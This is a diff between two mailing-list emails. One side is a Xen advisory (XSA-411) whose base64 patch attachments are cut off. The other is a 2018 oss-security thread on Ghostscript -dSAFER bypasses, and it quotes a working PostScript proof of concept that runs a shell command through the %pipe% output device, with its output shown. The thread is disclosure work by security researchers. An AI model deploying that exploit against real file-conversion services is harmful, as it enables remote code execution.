@@ -1,4 +1,9 @@
-Received: (qmail 22188 invoked by uid 550); 11 Oct 2022 12:05:35 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["9354" "Tuesday" "4" "September" "2018" "11:47:58" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkLOkSWe8x5N9Mf9bx1J9+oLnzNtHzTfEDXg0JGPj7N7DA@mail.gmail.com>" "278" "Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" "^Date:" nil nil "9" "2018090418:47:58" "[oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" (number mark "        taviso@googl Sep  4  278/9354  " thread-indent "\"Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?\"\n") "<20180903105747.dihmczuqhl4kcnx5@suse.de>" ("<CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>" "<alpine.GSO.2.20.1808221612460.22335@scrappy.simplesystems.org>" "<5b7dd771.1c69fb81.a6d8.6521@mx.google.com>" "<alpine.GSO.2.20.1808230753470.3841@freddy.simplesystems.org>" "<5b7eb7b2.1c69fb81.6b98e.519f@mx.google.com>" "<alpine.GSO.2.20.1808230958120.3639@scrappy.simplesystems.org>" "<CAJ_zFk+yb9zEXSqs2fdANvKkipg2yQAU89xKr1HMv-EJG2-vxg@mail.gmail.com>" "<20180828092517.eteuy4vzcpdpr62p@suse.de>" "<CAJ_zFk+dpXH453R0Hy5iHzYO2DkZjrBK3Sqh00Aie1z4=VDQOQ@mail.gmail.com>" "<CAJ_zFkLXTpjCijqNsHs0ZR4NdVwM+16ojUmxjYu0aZAgW=QhKQ@mail.gmail.com>" "<20180903105747.dihmczuqhl4kcnx5@suse.de>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 16026 invoked by uid 550); 4 Sep 2018 18:48:24 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,264 +11,326 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 22164 invoked from network); 11 Oct 2022 12:05:34 -0000
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=xen.org;
-	s=20200302mail; h=Date:Message-Id:Subject:CC:From:To:MIME-Version:
-	Content-Transfer-Encoding:Content-Type;
-	bh=dFQV4fOhLMkdX0k3VkiIWqiku+NkHYyvSTpf1rTiHUA=; b=3J84H67nyFcg13Y/Kjm+Kj8uB7
-	RD3056F0ZucJIY7O5Vz60ewi4VUsUM7yKI9XjzvqHtMp246XSGXevP7F3vqIXVSH8OooApTrFm6Cl
-	4mygkEIEKdeGMwYJW+aM9Qd60jddiVLYJ0ii3JQREVdlt4fta1Ib+7J4Fv2irzDsR6Q0=;
-Content-Type: multipart/mixed; boundary="=separator"; charset="utf-8"
-Content-Transfer-Encoding: binary
+Received: (qmail 16007 invoked from network); 4 Sep 2018 18:48:23 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=google.com; s=20161025;
+        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
+        bh=XZ1berGf3na6vAejhBr8t/RCo/NoGOYDWFtlGk1suxU=;
+        b=NtihN4j+UWSIAYcBwk1twSnPZWT5nP9wAOeZFrljJmO3EPE2jUL6Z1YAQAr2GoHrxU
+         4w2KkyNeu4g4SB+Id/cJXUrP/+quACpylQGk0VKqi+ZhF3r1a82VrjibP87TrjEkGcPV
+         I8Z7DeRUW0qHHjqvNbqKZeHuwNxWOIzP+M2jMLS6jwcm5ZB4sgCNuzv5z12JyOBmT6SB
+         o+TwjiGgeOJv+T0SjMUVd8vvMRISdorA+6cQLtts+0HMH3F4tmBnAsgUEkJM3Vx0i8o6
+         neNp8TKhXEfw1pSlCz8eaqlrl2ny5DJeKr26Cdw0sDMuZH7AmBo+8YnaCgNsHBFn7oe4
+         FQEA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
+         :message-id:subject:to;
+        bh=XZ1berGf3na6vAejhBr8t/RCo/NoGOYDWFtlGk1suxU=;
+        b=I6S8joFZpVntqBJpmXwxTyqsLUU5kTuu80UM0NgKewbGrqb50ukf4gHi0voT4uh2/3
+         D6JWlsGWDwvqGlSu+P2jLW955/6B3rX2Ks6TjfRkT6emAZ6+xmxq2Jl0UhttaYwjd1u8
+         DBgR5n6CbNWTnkA2eDrGj7BAZ6NYiKpxOArWGHy524DpXEopH0WvfTqQirsJ5oB3J+DT
+         3iwhi6lKqqn9EBooNPkwFYTpGduTD/oCqB8mPA0x1+DVAEoKRYCxn0S/iCDKzkQiKWU5
+         9fTKlZEttzuPMPVSFkHXppclvfCMsa9q35tM7UarFZlULu8XWHc/PVndPzYKppdA8gOs
+         ECJQ==
+X-Gm-Message-State: APzg51DDx6EW51gJ8OzWJd1w3+TFxsWDQMHodCojITxx9xTjS7DkqozM
+	ZzccoQtyogcMnFpb7T13UrWQTrVtnDLq09nhjHdLHxOL
+X-Google-Smtp-Source: ANB0Vda+W9BJfoWRp+pn+Bv/RGsuhBzQyEczYQu57YEJhjw2E59x6D2YFBwtFVpZQgLoNDoGnLxJZ0fGW9s98wemhVA=
+X-Received: by 2002:ac8:76c4:: with SMTP id q4-v6mr31297560qtr.95.1536086890304;
+ Tue, 04 Sep 2018 11:48:10 -0700 (PDT)
 MIME-Version: 1.0
-X-Mailer: MIME-tools 5.509 (Entity 5.509)
-To: xen-announce@lists.xen.org, xen-devel@lists.xen.org,
- xen-users@lists.xen.org, oss-security@lists.openwall.com
-From: Xen.org security team <security@xen.org>
-CC: Xen.org security team <security-team-members@xen.org>
-Message-Id: <E1oiE0a-0001d2-A6@xenbits.xenproject.org>
-Date: Tue, 11 Oct 2022 12:05:16 +0000
-Subject: [oss-security] Xen Security Advisory 411 v3 (CVE-2022-33748) - lock order
- inversion in transitive grant copy handling
+References: <CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>
+ <alpine.GSO.2.20.1808221612460.22335@scrappy.simplesystems.org>
+ <5b7dd771.1c69fb81.a6d8.6521@mx.google.com> <alpine.GSO.2.20.1808230753470.3841@freddy.simplesystems.org>
+ <5b7eb7b2.1c69fb81.6b98e.519f@mx.google.com> <alpine.GSO.2.20.1808230958120.3639@scrappy.simplesystems.org>
+ <CAJ_zFk+yb9zEXSqs2fdANvKkipg2yQAU89xKr1HMv-EJG2-vxg@mail.gmail.com>
+ <20180828092517.eteuy4vzcpdpr62p@suse.de> <CAJ_zFk+dpXH453R0Hy5iHzYO2DkZjrBK3Sqh00Aie1z4=VDQOQ@mail.gmail.com>
+ <CAJ_zFkLXTpjCijqNsHs0ZR4NdVwM+16ojUmxjYu0aZAgW=QhKQ@mail.gmail.com> <20180903105747.dihmczuqhl4kcnx5@suse.de>
+In-Reply-To: <20180903105747.dihmczuqhl4kcnx5@suse.de>
+Message-ID: <CAJ_zFkLOkSWe8x5N9Mf9bx1J9+oLnzNtHzTfEDXg0JGPj7N7DA@mail.gmail.com>
+Content-Type: multipart/alternative; boundary="0000000000007198c3057510193f"
+Date: Tue, 4 Sep 2018 11:47:58 -0700
+From: Tavis Ormandy <taviso@google.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS
+ coders in policy.xml by default?
+To: oss-security@lists.openwall.com
 
---=separator
-Content-Type: text/plain; charset="utf-8"
-Content-Disposition: inline
-Content-Transfer-Encoding: 7bit
+--0000000000007198c3057510193f
+Content-Type: text/plain; charset="UTF-8"
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Thanks Marcus. FWIW, over the weekend upstream fixed all of the bugs I had
+opened. Just looking this morning and I can see one or two of the fixes
+were incomplete, I'll file new bugs and hopefully new fixes make it into
+9.24 release.
 
-            Xen Security Advisory CVE-2022-33748 / XSA-411
-                               version 3
+(I'm only fuzzing with sort -R < postscript_commands.txt | gs -dSAFER, so
+totally possible we'll have to do this again soon)
 
-        lock order inversion in transitive grant copy handling
+Tavis.
 
-UPDATES IN VERSION 3
-====================
+(p.s. I'm not exaggerating about the sort -R, that's literally how I'm
+fuzzing it)
 
-Public release.
+On Mon, Sep 3, 2018 at 3:59 AM Marcus Meissner <meissner@suse.de> wrote:
 
-ISSUE DESCRIPTION
-=================
+> Hi,
+>
+> I am still holding back CVE requesting as CERT promised to do this.
+>
+> If they do not reply with a plan until tomorrow I will proceed with
+> requesting.
+>
+> Ciao, Marcus
+> On Wed, Aug 29, 2018 at 01:43:22PM -0700, Tavis Ormandy wrote:
+> > I should note, just add `userdict /setpagedevice undef` at the top if you
+> > want to test it with ImageMagick.
+> >
+> > Tavis.
+> >
+> > On Wed, Aug 29, 2018 at 1:14 PM Tavis Ormandy <taviso@google.com> wrote:
+> >
+> > > Thanks Marcus, here are some more necessary commits:
+> > >
+> > >
+> > >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=520bb0ea7519aa3e79db78aaf0589dae02103764
+> > > # 699654 D /invalidaccess checks stop working after a failed restore
+> > >
+> > >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5b5536fa88a9e885032bc0df3852c3439399a5c0
+> > > # 699670 gssetresolution memory corruption
+> > >
+> > >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> > > # 699671 handling /undefined results in SEGV
+> > >
+> > >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> > > # 699676 PDF interpreter can leave dangerous operators available
+> > >
+> > > Please note that not all issues are resolved, and I have exploits that
+> > > still work against HEAD.
+> > >
+> > > For example, this will still work if you pull master as of this
+> writing:
+> > >
+> > > $ cat testcase.pdf
+> > > %!PS
+> > > % This is ghostscript bug #699687 (split out from bug #699654)
+> > >
+> > > a0 % just select a papersize to initialize page device
+> > >
+> > > % You can't def HWResolution (for example), because currentpagedevice
+> is
+> > > readonly:
+> > > %
+> > > % GS>currentpagedevice wcheck ==
+> > > % false
+> > > %
+> > > % But you can just put or astore into it, because the array itself is
+> > > writable:
+> > > % GS>currentpagedevice /HWResolution get wcheck ==
+> > > % true
+> > > %
+> > > % If you put some junk in there, then grestore stops working.
+> > > currentpagedevice /HWResolution get 0 (foobar) put
+> > >
+> > > % this grestore will fail, `stopped` just handles the error instead of
+> > > aborting.
+> > > { grestore } stopped {} if
+> > >
+> > > % now LockSafetyParams will be incorrectly unset, you can check like
+> this:
+> > > % GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams
+> get
+> > > == pop
+> > > % false
+> > >
+> > > % we can change and configure devices now, so make sure we're using one
+> > > with
+> > > % a OutputFile property.
+> > > (ppmraw) selectdevice
+> > >
+> > > % run a shell command
+> > > mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+> > > showpage
+> > > $ evince testcase.pdf
+> > > uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+> > > context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+> > > (libspectre) ghostscript reports: ioerror -12
+> > >
+> > > Tavis.
+> > >
+> > > On Tue, Aug 28, 2018 at 2:26 AM Marcus Meissner <meissner@suse.de>
+> wrote:
+> > >
+> > >> Hi,
+> > >>
+> > >> I had 4 CVEs assigned yesterday afternoon already working from CERTs
+> list,
+> > >> see inline comments below. Please adjust if something is incorrect in
+> > >> them.
+> > >>
+> > >> CERT has mailed overnight that they will take care of the CVE
+> assignment,
+> > >> so
+> > >> I am defering the rest to them.
+> > >>
+> > >> Ciao, Marcus
+> > >>
+> > >> On Mon, Aug 27, 2018 at 04:02:46PM -0700, Tavis Ormandy wrote:
+> > >> > Here is an update, Artifex made a press release
+> > >> > <
+> > >>
+> https://www.darkreading.com/prnewswire2.asp?rkey=20180824UN89145&filter=3930
+> > >> >
+> > >> > listing
+> > >> > some necessary commits, but the list was incomplete.
+> > >> >
+> > >> > Here is a list of relevant commits I'm aware of so far, some issues
+> are
+> > >> > still open with working exploits available. It's my understanding
+> that
+> > >> no
+> > >> > new release is planned until late September, and vendors need to
+> either
+> > >> > ship a git snapshot when all issues are resolved, or apply patches.
+> I
+> > >> have
+> > >> > testcases for each problem, but I think the bugs will be visible
+> > >> eventually
+> > >> > so I'm not posting them here.
+> > >> >
+> > >> >
+> > >>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> > >> > # 699671
+> > >> > handling /undefined results in SEGV
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0edd3d6c63
+> > >> > # 699659 missing type check in ztype
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=78911a01b6 #
+> > >> > 699654 A /invalidaccess checks stop working after a failed restore
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5516c614dc33
+> > >> #
+> > >> > 699654 B /invalidaccess checks stop working after a failed restore
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79cccf641486
+> > >> #
+> > >> > 699654 C /invalidaccess checks stop working after a failed restore
+> > >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b326a716
+> #
+> > >> 699655
+> > >> > - missing type checking in setcolor
+> > >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c3476dde
+> #
+> > >> 699656
+> > >>
+> > >>
+> > >> > - LockDistillerParams boolean missing type checks
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a054156d42
+> > >>         CVE-2018-15910
+> > >>
+> > >>
+> > >> > # 699658 - Bypassing PermitFileReading by handling undefinedfilename
+> > >> errors
+> > >>
+> > >>
+> > >> >
+> > >>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0b6cd1918e1ec4ffd087400a754a845180a4522b
+> > >> > # 699660 - shading_param incomplete type checking
+> > >> >
+> > >>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=e01e77a36cbb2e0277bc3a63852244bec41be0f6
+> > >> > # 699660 - shading_param incomplete type checking
+> > >>         CVE-2018-15909
+> > >>
+> > >>
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c432131c3f
+> > >> > # 699661 - pdf14 garbage collection memory corruption
+> > >> >
+> > >>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=971472c83a345a16dac9f90f91258bb22dd77f22
+> > >> > # 699663 - .setdistillerkeys memory corruption
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=241d911127
+> > >> > # 699664 - corrupt device object after error in job
+> > >>
+> > >>
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0d3901189f
+> > >> > # 699657 - .tempfile SAFER restrictions seem to be broken
+> > >>         CVE-2018-15908
+> > >>
+> > >> >
+> > >>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=8e9ce5016db968b40e4ec255a3005f2786cce45f
+> > >>
+> > >>
+> > >> > # 699665 - memory corruption in aesdecode
+> > >> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b575e1ec42
+> > >>
+> > >>         CVE-2018-15911
+> > >>
+> > >> > # 699668 - .definemodifiedfont memory corruption if /typecheck is
+> > >> handled
+> > >> >
+> > >> > Tavis
+> > >> >
+> > >> > On Thu, Aug 23, 2018 at 8:05 AM Bob Friesenhahn <
+> > >> > bfriesen@simple.dallas.tx.us> wrote:
+> > >> >
+> > >> > > On Thu, 23 Aug 2018, Leonardo Taccari wrote:
+> > >> > > >
+> > >> > > > (Regarding the `file.ps2' and `file.ps3' examples without
+> `PS2:' or
+> > >> > > > `PS3:' prefixes according `convert -debug Policy -log "%e"' it
+> seems
+> > >> > > > that they ends up as:
+> > >> > > >
+> > >> > > > Domain: Coder; rights=Read; pattern="PS" ...
+> > >> > > >
+> > >> > > > ...so should be blocked by the workaround described in
+> > >> > > > VU#332928. But please correct me if I'm wrong.)
+> > >> > >
+> > >> > > This is likely due to header magic detection (e.g.
+> "%!PS-Adobe").  It
+> > >> > > is possible that a different path will be taken if the common
+> > >> > > Postscript header is not detected.  The file extension may then be
+> > >> > > used as a hint.  Also, there are a wide varieties of ImageMagick
+> > >> > > versions in use, with a wide variety of behaviors.
+> > >> > >
+> > >> > > The version of ImageMagick provided by the Ubuntu Linux I am
+> using at
+> > >> > > this moment dates from 2012!
+> > >> > >
+> > >> > > Bob
+> > >> > > --
+> > >> > > Bob Friesenhahn
+> > >> > > bfriesen@simple.dallas.tx.us,
+> > >> http://www.simplesystems.org/users/bfriesen/
+> > >> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+> > >> > >
+> > >>
+> > >> --
+> > >> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg;
+> Zi.
+> > >> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
+> > >> meissner@suse.de>
+> > >>
+> > >
+>
+> --
+> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi.
+> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
+> meissner@suse.de>
+>
 
-As part of XSA-226 a missing cleanup call was inserted on an error
-handling path.  While doing so, locking requirements were not paid
-attention to.  As a result two cooperating guests granting each
-other transitive grants can cause locks to be acquired nested within
-one another, but in respectively opposite order.  With suitable
-timing between the involved grant copy operations this may result in
-the locking up of a CPU.
-
-IMPACT
-======
-
-Malicious or buggy guest kernels may be able to mount a Denial of
-Service (DoS) attack affecting the entire system.
-
-VULNERABLE SYSTEMS
-==================
-
-Xen versions 4.0 and newer are vulnerable.  Xen versions 3.4 and older
-are not vulnerable.
-
-Only guests with access to transitive grants can exploit the
-vulnerability.  In particular, this means that:
-
- * ARM systems which have taken the XSA-268 fix are not vulnerable, as
-   Grant Table v2 was disabled for other security reasons.
-
- * All systems with the XSA-226 fixes, and booted with
-   `gnttab=max-ver:1` or `gnttab=no-transitive` are not vulnerable.
-
- * From Xen 4.16, the maximum grant table version can be controlled on a
-   per-domain basis.  For the xl toolstack, the vulnerability does not
-   manifest if either:
-
-   1) Every guest has `max_grant_version=1` in their configuration file,
-      or
-
-   2) The global xl.conf has `max_grant_version=1`, and no guests have
-      the default overridden by selecting `max_grant_version=2`.
-
-Only multiple cooperating guests can exploit the vulnerability.
-
-MITIGATION
-==========
-
-Disallowing the use of transitive grants either via the
-`gnttab=no-transitive` Xen command line option, or by disabling grant
-interface version 2 altogether via the `gnttab=max-ver:1` Xen command
-line option or the xl controls as mentioned above will avoid the
-vulnerability.
-
-CREDITS
-=======
-
-This issue was discovered by Jan Beulich of SUSE.
-
-RESOLUTION
-==========
-
-Applying the appropriate attached patch resolves this issue.
-
-Note that patches for released versions are generally prepared to
-apply to the stable branches, and may not apply cleanly to the most
-recent release tarball.  Downstreams are encouraged to update to the
-tip of the stable branch before applying these patches.
-
-xsa411.patch           xen-unstable - Xen 4.15.x
-xsa411-4.14.patch      Xen 4.14.x - 4.13.x
-
-$ sha256sum xsa411*
-0802e2e4e9d03c82429a710bbb783cee2fded52d29b1d969b97c680d30c3ac57  xsa411.patch
-8473f2ee34562298c5174f0a5b3c64c561a945333aab675845093ad23250d1cf  xsa411-4.14.patch
-$
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of the patches described above (or others which are
-substantially similar) is permitted during the embargo, even on
-public-facing systems with untrusted guest users and administrators.
-
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
-
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
-
-HOWEVER, deployment of the mitigations is NOT permitted (except where
-all the affected systems and VMs are administered and used only by
-organisations which are members of the Xen Project Security Issues
-Predisclosure List).  Specifically, deployment on public cloud systems
-is NOT permitted.
-
-This is because it is a guest visible change which will draw attention
-to the issue.
------BEGIN PGP SIGNATURE-----
-
-iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAmNFTAAMHHBncEB4ZW4u
-b3JnAAoJEIP+FMlX6CvZPsQH/1JCqscbx49QygGVEnq43C97HQpcoZcUNJGwGjBJ
-Li0SXejxd3iWsYsFlMAgmacHIjevEGv318JJLSM21hBULGe85cc6QatpWS0VWrBc
-tQVbDIgqNRv42gJCtf1dLF0TnlTZ6p3wiqfsxEYBn1zlEhe2ZEMpY8an4707O32d
-nQ90JFh44QJXx6HMZD3pEw2g1+4pMDu9yDUp/Yc3YmxYnXmPW6KE7iMmGkLLGigI
-GfiTI4FA/BDVIZkjPErwG7pyXmp2sdtVkv5o/cg7YTOrLzeBmegdyUvzuXkizJ2F
-PQnc1rgS/vXPkC62cy6fmLkeAf0dQhq6KBuxW3N8s2fXRXk=
-=/bRo
------END PGP SIGNATURE-----
-
---=separator
-Content-Type: application/octet-stream; name="xsa411.patch"
-Content-Disposition: attachment; filename="xsa411.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbTogSmFuIEJldWxpY2ggPGpiZXVsaWNoQHN1c2UuY29tPgpTdWJqZWN0
-OiBnbnR0YWI6IGNvcnJlY3QgbG9ja2luZyBvbiB0cmFuc2l0aXZlIGdyYW50
-IGNvcHkgZXJyb3IgcGF0aAoKV2hpbGUgdGhlIGNvbW1lbnQgbmV4dCB0byB0
-aGUgbG9jayBkcm9wcGluZyBpbiBwcmVwYXJhdGlvbiBvZgpyZWN1cnNpdmVs
-eSBjYWxsaW5nIGFjcXVpcmVfZ3JhbnRfZm9yX2NvcHkoKSBtaXN0YWtlbmx5
-IHRhbGtzIGFib3V0IHRoZQpyZCA9PSB0ZCBjYXNlIChleGNsdWRlZCBhIGZl
-dyBsaW5lcyBmdXJ0aGVyIHVwKSwgdGhlIHNhbWUgY29uY2VybnMgYXBwbHkK
-dG8gdGhlIGNhbGxpbmcgb2YgcmVsZWFzZV9ncmFudF9mb3JfY29weSgpIG9u
-IGEgc3Vic2VxdWVudCBlcnJvciBwYXRoLgoKVGhpcyBpcyBDVkUtMjAyMi0z
-Mzc0OCAvIFhTQS00MTEuCgpGaXhlczogYWQ0OGZiOTYzZGJmICgiZ250dGFi
-OiBmaXggdHJhbnNpdGl2ZSBncmFudCBoYW5kbGluZyIpClNpZ25lZC1vZmYt
-Ynk6IEphbiBCZXVsaWNoIDxqYmV1bGljaEBzdXNlLmNvbT4KLS0tCnYyOiBF
-eHRlbmQgY29kZSBjb21tZW50LgoKLS0tIGEveGVuL2NvbW1vbi9ncmFudF90
-YWJsZS5jCisrKyBiL3hlbi9jb21tb24vZ3JhbnRfdGFibGUuYwpAQCAtMjYy
-Miw5ICsyNjIyLDggQEAgYWNxdWlyZV9ncmFudF9mb3JfY29weSgKICAgICAg
-ICAgICAgICAgICAgICAgIHRyYW5zX2RvbWlkKTsKIAogICAgICAgICAvKgot
-ICAgICAgICAgKiBhY3F1aXJlX2dyYW50X2Zvcl9jb3B5KCkgY291bGQgdGFr
-ZSB0aGUgbG9jayBvbiB0aGUKLSAgICAgICAgICogcmVtb3RlIHRhYmxlIChp
-ZiByZCA9PSB0ZCksIHNvIHdlIGhhdmUgdG8gZHJvcCB0aGUgbG9jawotICAg
-ICAgICAgKiBoZXJlIGFuZCByZWFjcXVpcmUuCisgICAgICAgICAqIGFjcXVp
-cmVfZ3JhbnRfZm9yX2NvcHkoKSB3aWxsIHRha2UgdGhlIGxvY2sgb24gdGhl
-IHJlbW90ZSB0YWJsZSwKKyAgICAgICAgICogc28gd2UgaGF2ZSB0byBkcm9w
-IHRoZSBsb2NrIGhlcmUgYW5kIHJlYWNxdWlyZS4KICAgICAgICAgICovCiAg
-ICAgICAgIGFjdGl2ZV9lbnRyeV9yZWxlYXNlKGFjdCk7CiAgICAgICAgIGdy
-YW50X3JlYWRfdW5sb2NrKHJndCk7CkBAIC0yNjYxLDExICsyNjYwLDI1IEBA
-IGFjcXVpcmVfZ3JhbnRfZm9yX2NvcHkoCiAgICAgICAgICAgICAgICAgICAg
-ICAgICAgIGFjdC0+dHJhbnNfZ3JlZiAhPSB0cmFuc19ncmVmIHx8CiAgICAg
-ICAgICAgICAgICAgICAgICAgICAgICFhY3QtPmlzX3N1Yl9wYWdlKSkgKQog
-ICAgICAgICB7CisgICAgICAgICAgICAvKgorICAgICAgICAgICAgICogTGlr
-ZSBhYm92ZSBmb3IgYWNxdWlyZV9ncmFudF9mb3JfY29weSgpIHdlIG5lZWQg
-dG8gZHJvcCBhbmQgdGhlbgorICAgICAgICAgICAgICogcmUtYWNxdWlyZSB0
-aGUgbG9ja3MgaGVyZSB0byBwcmV2ZW50IGxvY2sgb3JkZXIgaW52ZXJzaW9u
-IGlzc3Vlcy4KKyAgICAgICAgICAgICAqIFVubGlrZSBmb3IgYWNxdWlyZV9n
-cmFudF9mb3JfY29weSgpIHdlIGRvbid0IG5lZWQgdG8gcmUtY2hlY2sKKyAg
-ICAgICAgICAgICAqIGFueXRoaW5nLCBhcyByZWxlYXNlX2dyYW50X2Zvcl9j
-b3B5KCkgZG9lc24ndCBkZXBlbmQgb24gdGhlIGdyYW50CisgICAgICAgICAg
-ICAgKiB0YWJsZSBlbnRyeTogSXQgb25seSB1cGRhdGVzIGludGVybmFsIHN0
-YXRlIGFuZCB0aGUgc3RhdHVzIGZsYWdzLgorICAgICAgICAgICAgICovCisg
-ICAgICAgICAgICBhY3RpdmVfZW50cnlfcmVsZWFzZShhY3QpOworICAgICAg
-ICAgICAgZ3JhbnRfcmVhZF91bmxvY2socmd0KTsKKwogICAgICAgICAgICAg
-cmVsZWFzZV9ncmFudF9mb3JfY29weSh0ZCwgdHJhbnNfZ3JlZiwgcmVhZG9u
-bHkpOwogICAgICAgICAgICAgcmN1X3VubG9ja19kb21haW4odGQpOworCisg
-ICAgICAgICAgICBncmFudF9yZWFkX2xvY2socmd0KTsKKyAgICAgICAgICAg
-IGFjdCA9IGFjdGl2ZV9lbnRyeV9hY3F1aXJlKHJndCwgZ3JlZik7CiAgICAg
-ICAgICAgICByZWR1Y2Vfc3RhdHVzX2Zvcl9waW4ocmQsIGFjdCwgc3RhdHVz
-LCByZWFkb25seSk7CiAgICAgICAgICAgICBhY3RpdmVfZW50cnlfcmVsZWFz
-ZShhY3QpOwogICAgICAgICAgICAgZ3JhbnRfcmVhZF91bmxvY2socmd0KTsK
-KwogICAgICAgICAgICAgcHV0X3BhZ2UoKnBhZ2UpOwogICAgICAgICAgICAg
-KnBhZ2UgPSBOVUxMOwogICAgICAgICAgICAgcmV0dXJuIEVSRVNUQVJUOwo=
-
---=separator
-Content-Type: application/octet-stream; name="xsa411-4.14.patch"
-Content-Disposition: attachment; filename="xsa411-4.14.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbTogSmFuIEJldWxpY2ggPGpiZXVsaWNoQHN1c2UuY29tPgpTdWJqZWN0
-OiBnbnR0YWI6IGNvcnJlY3QgbG9ja2luZyBvbiB0cmFuc2l0aXZlIGdyYW50
-IGNvcHkgZXJyb3IgcGF0aAoKV2hpbGUgdGhlIGNvbW1lbnQgbmV4dCB0byB0
-aGUgbG9jayBkcm9wcGluZyBpbiBwcmVwYXJhdGlvbiBvZgpyZWN1cnNpdmVs
-eSBjYWxsaW5nIGFjcXVpcmVfZ3JhbnRfZm9yX2NvcHkoKSBtaXN0YWtlbmx5
-IHRhbGtzIGFib3V0IHRoZQpyZCA9PSB0ZCBjYXNlIChleGNsdWRlZCBhIGZl
-dyBsaW5lcyBmdXJ0aGVyIHVwKSwgdGhlIHNhbWUgY29uY2VybnMgYXBwbHkK
-dG8gdGhlIGNhbGxpbmcgb2YgcmVsZWFzZV9ncmFudF9mb3JfY29weSgpIG9u
-IGEgc3Vic2VxdWVudCBlcnJvciBwYXRoLgoKVGhpcyBpcyBDVkUtMjAyMi0z
-Mzc0OCAvIFhTQS00MTEuCgpGaXhlczogYWQ0OGZiOTYzZGJmICgiZ250dGFi
-OiBmaXggdHJhbnNpdGl2ZSBncmFudCBoYW5kbGluZyIpClNpZ25lZC1vZmYt
-Ynk6IEphbiBCZXVsaWNoIDxqYmV1bGljaEBzdXNlLmNvbT4KCi0tLSBhL3hl
-bi9jb21tb24vZ3JhbnRfdGFibGUuYworKysgYi94ZW4vY29tbW9uL2dyYW50
-X3RhYmxlLmMKQEAgLTI2MTcsOSArMjYxNyw4IEBAIGFjcXVpcmVfZ3JhbnRf
-Zm9yX2NvcHkoCiAgICAgICAgICAgICAgICAgICAgICB0cmFuc19kb21pZCk7
-CiAKICAgICAgICAgLyoKLSAgICAgICAgICogYWNxdWlyZV9ncmFudF9mb3Jf
-Y29weSgpIGNvdWxkIHRha2UgdGhlIGxvY2sgb24gdGhlCi0gICAgICAgICAq
